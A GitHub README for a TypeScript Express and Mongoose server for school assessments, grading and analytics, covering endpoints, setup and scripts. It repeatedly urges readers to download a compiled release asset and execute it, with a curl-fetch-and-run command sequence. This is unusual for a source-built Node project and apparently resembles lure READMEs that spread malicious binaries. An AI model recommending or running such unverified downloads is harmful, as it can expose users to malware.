[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Blovespy90/test-school-server/releases)

# Test School Server — Express LMS API for Assessments & Grading

![Server classroom illustration](https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1400&q=80)

A focused, TypeScript-based Express server built for education platforms. It handles assessments, users, classes, grading, and analytics. The code uses Mongoose for MongoDB models and provides a small CLI and scripts for local development and CI.

Badges
- Topics: assesment, express, lms, mongoose, nhb-express, nhb-scripts, nhb-toolbox, school, server, test, typescript
- CI: GitHub Actions, lint, test
- Releases: [Download release assets](https://github.com/Blovespy90/test-school-server/releases)

Key features
- REST API for assessments, questions, submissions, and grades. 🧪
- Role-based access: student, teacher, admin. 🔒
- Mongoose models and validation. 🗃️
- TypeScript types and runtime checks. 🧩
- Scriptable CLI for seeding data and running migrations. ⚙️
- Support for webhooks and grading pipelines. 🔔
- Minimal, testable controllers and service layers. 🧪

Who this serves
- LMS developers who need a test-grade server.
- Schools and training providers that run practice exams.
- Engineers building tools for assessments and analytics.

Table of contents
- Features
- Tech stack
- Quick start
- Download and run release file
- Local development
- Environment
- Database
- API overview
- Authentication
- Scripts and CLI
- Testing
- Deployment
- Contributing
- Changelog & Releases
- License
- Contact

Features (detailed)
- Assessment models: tests, sections, questions, choices, rubrics.
- Submission flow: create submission, save answers, auto-grade, manual review.
- Grading engine: numeric, rubric, partial-credit, custom scripts.
- Analytics endpoints: pass rate, item analysis, teacher dashboards.
- Export: CSV and JSON exports for grades and submissions.
- Health checks, metrics, and basic rate limits.
- Plugin hooks for custom grading modules.

Tech stack
- Node.js (TypeScript)
- Express
- Mongoose (MongoDB)
- Jest for tests
- ESLint, Prettier
- Dockerfile for container builds
- GitHub Actions for CI
- Optional: Redis for queueing (recommended for production grading)

Quick start — release download and execution
- This repository publishes compiled server releases. Download the server release asset from the Releases page and execute the file.
- Visit and download the release asset here: https://github.com/Blovespy90/test-school-server/releases

Example run (generic)
1. Download the release asset you need from the Releases page.
2. Example shell commands (replace <asset-url> with the actual asset link):
   - curl -L -o test-school-server.tar.gz "<asset-url>"
   - tar -xzf test-school-server.tar.gz
   - cd test-school-server
   - ./run.sh   # or ./test-school-server

If the release link does not load or if you cannot find the binary, check the Releases section on GitHub for available assets and instructions.

Local development (source)
1. Clone the repo
   - git clone https://github.com/Blovespy90/test-school-server.git
   - cd test-school-server
2. Install
   - npm ci
3. Environment
   - Copy .env.example to .env and set values
4. Start dev server
   - npm run dev
5. Seed data (optional)
   - npm run seed

Environment variables (core)
- PORT=3000
- MONGO_URI=mongodb://localhost:27017/test-school
- JWT_SECRET=change_this_secret
- NODE_ENV=development
- REDIS_URL=redis://localhost:6379  (optional for queueing)
Use the .env.example file in the repo root.

Database
- The server uses MongoDB with Mongoose schemas.
- Models:
  - User (roles: student, teacher, admin)
  - Course
  - Assessment
  - Question
  - Submission
  - Grade
- Run local MongoDB or use a cloud instance.
- Indexes: ensure proper indexes for queries on course and assessment ids.

API overview (core endpoints)
- Auth
  - POST /api/auth/login — returns JWT
  - POST /api/auth/register — create user
- Users
  - GET /api/users — list users (admin)
  - GET /api/users/:id — user details
- Courses
  - GET /api/courses
  - POST /api/courses
- Assessments
  - GET /api/assessments
  - POST /api/assessments
  - GET /api/assessments/:id
- Submissions
  - POST /api/assessments/:id/submissions — start or submit
  - GET /api/submissions/:id — status and answers
- Grades
  - GET /api/assessments/:id/grades
  - POST /api/submissions/:id/grade — manual override

Sample request (JS fetch)
- const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

Authentication
- JWT based, short lived access tokens.
- Role-based middleware checks.
- Use Authorization: Bearer <token> header for secured endpoints.

Scripts and CLI
- npm run start — start production server (node build)
- npm run dev — start with ts-node-dev for development
- npm run build — compile TypeScript
- npm run lint — run ESLint
- npm run test — run Jest tests
- npm run seed — seed DB with demo data
- CLI tools:
  - bin/ts-server-cli seed
  - bin/ts-server-cli migrate
  - bin/ts-server-cli clear-cache

Testing
- Unit tests cover services and controllers.
- Integration tests run with a test database.
- Tests run with:
  - npm run test
- Use NODE_ENV=test and a separate MongoDB instance for CI.

Docker
- Dockerfile builds an image with Node and production build.
- Example:
  - docker build -t test-school-server .
  - docker run -e MONGO_URI="mongodb://host:27017/test-school" -p 3000:3000 test-school-server

Logging and metrics
- The server logs requests and errors to stdout.
- Metric endpoints:
  - GET /api/health
  - GET /api/metrics  (Prometheus format)
- Use external collectors in production.

Security
- Input validation on all endpoints.
- Rate limit middleware for public routes.
- Sensitive keys live in environment variables.
- Use HTTPS and set secure cookie flags if using cookies.

Deployment notes
- For production, use a process manager like PM2 or a container runtime.
- Use a managed MongoDB for reliability.
- Attach a job worker for heavy grading tasks. Use Redis and a simple queue.
- Use horizontal scaling of stateless API servers.

Releases & changelog
- Release assets live here: https://github.com/Blovespy90/test-school-server/releases
- Download a release asset and run the included binary or script as documented on the release page.
- The changelog file tracks breaking changes, API updates, and migration steps. See the Releases page for tagged versions and assets.

Contributing
- Fork the repo and open a PR.
- Follow the code style: ESLint rules and Prettier.
- Write tests for new features.
- Use feature branches named feat/<short-desc> or fix/<short-desc>.
- Add entries to CHANGELOG.md for user-facing changes.

Code of conduct
- Be respectful.
- Open a polite issue or PR for any change.

Common troubleshooting
- Server fails to connect to MongoDB:
  - Verify MONGO_URI.
  - Check network and credentials.
- JWT issues:
  - Ensure JWT_SECRET matches between services.
- Missing release asset:
  - Visit Releases and pick an asset for your platform.

Assets and images
- Use the school's logo or a neutral illustration for public pages.
- Example image used above from Unsplash (education theme).

License
- MIT — see LICENSE file.

Contact
- Open an issue on GitHub for bugs or features.
- Use PRs for code contributions.

Credits
- Built with Express, TypeScript, and Mongoose.
- Inspired by real LMS needs: assessment workflows, grading pipelines, and teacher tools.

Changelog highlights
- v1.2.0 — add rubric grading and CSV export
- v1.1.0 — add role checks and ribbon analytics
- v1.0.0 — initial stable release

Support & releases
- For binary downloads, configuration files, and step-by-step release notes, go to the Releases page and download the asset you need: https://github.com/Blovespy90/test-school-server/releases

Emoji legend
- 🎓 classroom features
- 🧪 assessment and tests
- 🔒 security and auth
- ⚙️ tooling and scripts
- 📦 release and binaries

Follow the repo topics for discoverability:
- assesment, express, lms, mongoose, nhb-express, nhb-scripts, nhb-toolbox, school, server, test, typescript

Thank you for checking this project.